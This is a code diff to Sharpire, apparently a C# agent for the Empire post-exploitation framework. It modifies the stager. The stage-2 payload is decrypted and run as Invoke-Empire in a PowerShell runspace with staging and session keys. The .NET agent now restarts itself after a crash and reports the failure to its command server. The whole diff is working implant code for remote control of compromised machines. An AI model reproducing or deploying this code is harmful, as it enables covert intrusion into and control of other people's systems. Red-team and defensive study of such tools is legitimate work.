@@ -73,21 +73,22 @@ namespace Sharpire
                     try
                     {
                         Console.WriteLine("Launching Empire");
-                        IntPtr handle = Misc.GetConsoleWindow();
-                        Misc.ShowWindow(handle, Misc.SW_HIDE);
+                        //IntPtr handle = Misc.GetConsoleWindow();
+                        //Misc.ShowWindow(handle, Misc.SW_HIDE);
                         if (language == "powershell" || language == "ps" || language == "posh")
                         {
-                            powershellEmpire(stage2response);
+                            PowershellEmpire(stage2response);
                         }
                         else if (language == "dotnet" || language == "net" || language == "clr")
                         {
-                            dotNetEmpire();
+                            DotNetEmpire();
                         }
                     }
                     catch
                     {
                         Console.WriteLine("Empire Failure");
-                        throw;
+                        GC.Collect();
+                        execute();
                     }
                 }
                 catch
@@ -183,7 +184,8 @@ namespace Sharpire
         }
 
         ////////////////////////////////////////////////////////////////////////////////
-        private void powershellEmpire(byte[] stage2Response)
+        ////////////////////////////////////////////////////////////////////////////////
+        private void PowershellEmpire(Byte[] stage2Response)
         {
             string empire = Encoding.ASCII.GetString(aesDecrypt(key, stage2Response));
             string execution = "Invoke-Empire";
@@ -191,24 +193,37 @@ namespace Sharpire
             execution += " -StagingKey \"" + stagingKey + "\"";
             execution += " -SessionKey \"" + key + "\"";
             execution += " -SessionID  \"" + id + "\"";
-            Console.WriteLine(execution);
 
-            Runspace runspace = RunspaceFactory.CreateRunspace();
-            runspace.Open();
-            RunspaceInvoke scriptInvoker = new RunspaceInvoke(runspace);
+            using (Runspace runspace = RunspaceFactory.CreateRunspace())
+            {
+                runspace.Open();
 
-            Pipeline pipeline = runspace.CreatePipeline();
-            pipeline.Commands.AddScript(empire + ";" + execution + ";");
-            //pipeline.Commands.Add("Out-String");
-            pipeline.Invoke();
-            //runspace.Close();
+                using (Pipeline pipeline = runspace.CreatePipeline())
+                {
+                    pipeline.Commands.AddScript(empire + ";" + execution + ";");
+                    pipeline.Invoke();
+                }
+            }
         }
 
         ////////////////////////////////////////////////////////////////////////////////
-        private void dotNetEmpire()
+        ////////////////////////////////////////////////////////////////////////////////
+        private void DotNetEmpire()
         {
             Agent agent = new Agent(stagingKey, key, id, server);
-            agent.execute();
+            Coms coms = agent.GetComs();
+            try
+            {
+                agent.Execute();
+            }
+            catch (Exception ex)
+            {
+                coms.sendMessage(coms.encodePacket(41, "[-] Catastrophic .Net Agent Failure, Attempting Agent Restart: " + ex, 0));
+                agent = null;
+                coms = null;
+                GC.Collect();
+                DotNetEmpire();
+            }
         }
 
         ////////////////////////////////////////////////////////////////////////////////
